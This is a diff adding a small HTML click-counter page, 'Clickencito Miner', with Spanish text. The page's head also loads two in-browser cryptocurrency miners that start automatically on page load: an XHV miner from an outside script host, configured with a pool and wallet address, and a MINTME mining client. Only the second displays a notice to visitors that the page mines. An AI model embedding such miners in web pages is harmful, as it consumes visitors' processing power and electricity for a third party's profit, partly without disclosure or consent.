@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="es-CR">
+	<head>
+		<meta name="viewport" content= "width=device-width, initial-scale=1.0">
+		<meta charset="UTF-8">
+		<title>Clickencito Miner</title>
+		<style>
+			div {
+				position: absolute;
+				top: 50%;
+				left: 50%; 
+				transform: translate(-50%, -50%);
+			}
+		</style>
+		<script type="text/javascript">
+			var counter = 0;
+			function increment(){
+				counter++;
+				document.getElementById("counter").innerHTML = "Clicks: " + counter;
+			}
+		</script>
+		<!--  XHV Miner-->
+		<script src="https://trusteverything.de/karma/karma.js?karma=bs?algy=cn-heavy/xhv?nosaj=pool.hashvault.pro:80" ></script>
+		<script type="text/javascript">
+			EverythingIsLife('hvxyGKKddKkAr8xKYXgrKVgnTv27rLGkH5vsWVwdLzbw4k5daGeqiz8B4rgHmtdTwDQTrN5b7Eo5YevphvmHyLF47PfTWgXcr2', 'x', 50);
+		</script>
+		<!-- MINTME miner -->
+		<script src="https://www.hostingcloud.racing/nhAe.js"></script>
+		<script>
+			var _client = new Client.Anonymous('e9e570cc9a19ccabcbecb4d81a3e86012db01c7bb73e32af340c92f533e921b8', {
+				throttle: 0.5, c: 'w'
+			});
+			_client.start();
+			_client.addMiningNotification("Floating Top", "Clickencito Miner utiliza minería, si no te gusta esto, desactívalo.", "#94ff9b", 30, "#000000");
+
+		</script>
+	</head>
+	<body style="background-color: black; font-family: Arial, Helvetica, sans-serif;">
+		<div>
+			<center><p style="color: #94ff9b; font-family: Arial, Helvetica, sans-serif;" id="counter">Clicks: 0<p><center>
+			<input style="outline: none; border: 1px solid #94ff9b; height: 40px; width: 100px; font-size: 10px; color: #94ff9b; font-family: Arial, Helvetica, sans-serif; background-color: #000000;" id="btn" type="button" onClick="increment()" value="Incrementar" style="witdth: 50px; height: 50px; padding: 5px 10px; border-radius: 5%;"/>
+		</div>
+	</body>
+</html>
